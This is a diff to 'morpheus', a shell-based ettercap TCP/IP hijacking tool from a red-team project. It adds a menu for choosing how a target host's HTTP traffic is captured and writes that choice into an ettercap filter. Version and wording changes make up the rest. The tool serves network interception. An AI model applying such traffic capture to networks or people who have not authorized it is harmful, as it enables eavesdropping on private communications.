@@ -1,7 +1,7 @@
 #!/bin/sh
 ###
 # morpheus - automated ettercap TCP/IP Hijacking tool
-# Author: pedr0 Ubuntu [r00t-3xp10it] version: 2.2
+# Author: pedr0 Ubuntu [r00t-3xp10it] version: 2.3
 # Suspicious-Shell-Activity (SSA) RedTeam develop @2018
 # codename: oneiroi_phobetor [ GPL licensed ]
 #
@@ -53,7 +53,7 @@ Reset="${Escape}[0m";
 # Variable declarations
 # ---------------------
 dtr=`date | awk '{print $4}'`        # grab current hour
-V3R="2.2"                            # module version number
+V3R="2.3"                            # module version number
 cnm="oneiroi_phobetor"               # module codename
 DiStR0=`awk '{print $1}' /etc/issue` # grab distribution -  Ubuntu or Kali
 IPATH=`pwd`                          # grab morpheus.sh install path
@@ -2908,7 +2908,7 @@ fi
 
 
 # ----------------------------------------
-# tcp http header infomation gather
+# tcp http headers infomation gather
 # ----------------------------------------
 sh_stage22 () {
 
@@ -2921,7 +2921,7 @@ echo ""
 sleep 2
 
 # run module?
-rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "[ http tcp header information gathering ]\nExecute this module?" --width 300) > /dev/null 2>&1
+rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "HTTP tcp Header Information Gathering\nExecute this module?" --width 300) > /dev/null 2>&1
 if [ "$?" -eq "0" ]; then
 
 
@@ -2932,12 +2932,28 @@ cp $IPATH/filters/IG.eft $IPATH/filters/IG.bak > /dev/null 2>&1
 rhost=$(zenity --title="☠ DEVICE TO FILTER ☠" --text "example: $IP\nchose remote target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
 # write taget ip addr in ip.mop so IG.sh can use it ..
 echo "target:$rhost" > $IPATH/output/ip.mop
+#
+# chose the type of capture
+#
+Tc=$(zenity --list --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Chose the type of capture" --radiolist --column "Pick" --column "Option" TRUE "capture only ip source packets" FALSE "capture source and destination packets" --width 350 --height 190) > /dev/null 2>&1
+if [ "$Tc" = "capture only ip source packets" ]; then
+  FCT="if (ip.src == '$rhost') {"
+elif [ "$Tc" = "capture source and destination packets" ]; then
+  FCT="if (ip.src == '$rhost' || ip.dst == '$rhost') {"
+else
+  echo ${RedF}[x] ${white}Please chose one ${RedF}capture Type${white} before Continue ..${Reset};
+  # clean all stuff up ..
+  sleep 2 && rm -f $IPATH/output/ip.mop > /dev/null 2>&1
+  mv $IPATH/filters/IG.bak $IPATH/filters/IG.eft > /dev/null 2>&1
+  exit
+fi
 
 
   cd $IPATH/filters
   # replace values in template.filter with sed bash command
   echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
   sed -i "s|TaRgEt|$rhost|g" IG.eft
+  sed -i "s/RepLaCe/$FCT/" IG.eft
   cd $IPATH
   zenity --info --title="☠ MORPHEUS SCRIPTING CONSOLE ☠" --text "morpheus framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270 > /dev/null 2>&1
   xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/IG.eft"
